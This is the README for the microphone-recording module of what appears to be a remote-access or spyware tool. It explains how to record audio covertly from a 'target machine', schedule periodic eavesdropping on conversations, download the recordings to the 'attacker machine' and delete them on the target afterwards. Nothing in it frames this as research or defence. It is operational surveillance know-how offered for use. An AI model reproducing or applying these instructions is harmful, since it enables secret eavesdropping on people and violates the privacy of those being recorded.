# Audio Recordings Directory

This directory stores audio recordings captured from the target machine's microphone.

## File Information

### File Naming Convention

- **Format:** `audio_YYYYMMDD_HHMMSS.wav`
- **Example:** `audio_20251004_143022.wav`
- **Location:** `logs/audio/`

### Audio Specifications

**Default Settings:**

- **Format:** WAV (Waveform Audio File)
- **Sample Rate:** 44100 Hz (CD quality)
- **Channels:** 2 (Stereo)
- **Bit Depth:** 16-bit
- **Quality:** Uncompressed, lossless

## Commands

### Record Audio

```bash
audio_record <duration>
```

**Parameters:**

- `duration` - Recording duration in seconds (default: 10)

**Examples:**

```bash
audio_record          # Record for 10 seconds (default)
audio_record 30       # Record for 30 seconds
audio_record 60       # Record for 1 minute
audio_record 300      # Record for 5 minutes
```

**Output:**

```
Audio recorded: logs/audio/audio_20251004_143022.wav
```

### List Recordings

```bash
audio_list
```

Lists all audio recordings in the directory.

**Output:**

```
audio_20251004_143022.wav
audio_20251004_150530.wav
audio_20251004_163045.wav
```

### Download Recordings

```bash
download logs/audio/audio_20251004_143022.wav
```

Downloads specific audio file to attacker machine.

## Recording Methods

The module uses multiple methods for compatibility:

### 1. PyAudio (Primary Method)

**Library:** pyaudio

**Installation:**

```bash
# macOS
brew install portaudio
pip install pyaudio

# Ubuntu/Debian
sudo apt-get install portaudio19-dev python3-pyaudio
pip install pyaudio

# Fedora/CentOS
sudo dnf install portaudio-devel
pip install pyaudio
```

**Specifications:**

- Chunk size: 1024 frames
- Format: 16-bit PCM
- Channels: 2 (Stereo)
- Sample rate: 44100 Hz

### 2. System Commands (Fallback)

**macOS:**

```bash
sox -d <filename> trim 0 <duration>
```

**Linux:**

```bash
arecord -d <duration> -f cd <filename>
```

**Windows:**

- Requires pyaudio library
- No native command-line fallback

## File Sizes

Approximate file sizes for WAV format (stereo, 44.1kHz, 16-bit):

| Duration   | File Size |
| ---------- | --------- |
| 10 seconds | ~1.7 MB   |
| 30 seconds | ~5 MB     |
| 1 minute   | ~10 MB    |
| 5 minutes  | ~50 MB    |
| 10 minutes | ~100 MB   |
| 30 minutes | ~300 MB   |
| 1 hour     | ~600 MB   |

**Formula:** ~10 MB per minute (stereo, CD quality)

## Storage Considerations

### Disk Space Management

**Recommendations:**

- **Short recordings:** For voice samples (10-30 seconds)
- **Medium recordings:** For conversations (1-5 minutes)
- **Long recordings:** Only if necessary (5+ minutes)

### Reducing File Size

1. **Use shorter durations**
2. **Convert to compressed format:**

   ```bash
   # Convert WAV to MP3 (much smaller)
   ffmpeg -i audio_20251004_143022.wav -b:a 128k audio_20251004_143022.mp3
   # MP3 is ~10x smaller than WAV
   ```

3. **Use mono instead of stereo** (if supported in future versions)

## Usage Examples

### Quick Voice Sample

```bash
# Record 15 seconds of audio
audio_record 15
```

### Conversation Recording

```bash
# Record 5 minute conversation
audio_record 300
```

### Periodic Monitoring

```bash
# Record 30 seconds every 5 minutes
audio_record 30
# (wait 5 minutes)
audio_record 30
# Repeat...
```

### Download All Recordings

```bash
# List recordings
audio_list

# Download each file
download logs/audio/audio_20251004_143022.wav
download logs/audio/audio_20251004_150530.wav
```

## Cleanup

### Remove All Recordings

```bash
# On target machine
rm -rf logs/audio/*

# Keep directory, delete files
rm logs/audio/*.wav
rm logs/audio/*.mp3
```

### Remove Old Recordings

```bash
# Remove recordings older than 7 days
find logs/audio/ -name "*.wav" -mtime +7 -delete

# Remove recordings older than 24 hours
find logs/audio/ -name "*.wav" -mtime +1 -delete
```

### Compress Before Deleting

```bash
# Archive old recordings
tar -czf audio_archive_$(date +%Y%m%d).tar.gz logs/audio/*.wav

# Then delete originals
rm logs/audio/*.wav
```

## Audio Quality

### Quality Levels

**CD Quality (Default):**

- Sample rate: 44100 Hz
- Bit depth: 16-bit
- Channels: Stereo
- Use: High quality, clear audio

**Telephone Quality:**

- Sample rate: 8000 Hz
- Bit depth: 8-bit
- Channels: Mono
- Use: Voice only, small files

### When to Use CD Quality

✅ Music recording
✅ High-quality voice capture
✅ Evidence collection
✅ Professional recordings
✅ When file size isn't critical

### When Lower Quality is Acceptable

- Voice-only recordings
- Quick samples
- Disk space is limited
- Bandwidth is limited

## Troubleshooting

### Issue: "PyAudio library not available"

**Solutions:**

**macOS:**

```bash
brew install portaudio
pip install pyaudio
```

**Ubuntu/Debian:**

```bash
sudo apt-get update
sudo apt-get install portaudio19-dev python3-pyaudio
pip install pyaudio
```

**Fedora/CentOS:**

```bash
sudo dnf install portaudio-devel
pip install pyaudio
```

**Windows:**

```bash
pip install pyaudio
```

### Issue: No audio recorded / Silent file

**Causes:**

- Microphone disabled
- Wrong audio input selected
- Permissions not granted
- No audio activity during recording

**Solutions:**

1. Check microphone is enabled and working
2. Grant microphone permissions:
   - macOS: System Preferences > Security & Privacy > Privacy > Microphone
   - Linux: Check PulseAudio/ALSA settings
   - Windows: Settings > Privacy > Microphone
3. Test microphone with system tools first
4. Ensure audio input is active during recording

### Issue: Permission denied

**Solutions:**

```bash
# Create audio directory
mkdir -p logs/audio

# Check permissions
chmod 755 logs/audio

# On macOS, grant Terminal microphone access
# System Preferences > Security & Privacy > Privacy > Microphone
```

### Issue: Large file sizes

**Solutions:**

```bash
# Convert to compressed format
ffmpeg -i audio_20251004_143022.wav -b:a 128k audio_20251004_143022.mp3

# Use shorter recording durations
audio_record 30  # Instead of audio_record 300
```

### Issue: Audio quality poor

**Causes:**

- Background noise
- Microphone quality
- Low input volume
- Distance from microphone

**Solutions:**

- Use better microphone
- Reduce background noise
- Adjust input volume
- Move closer to microphone
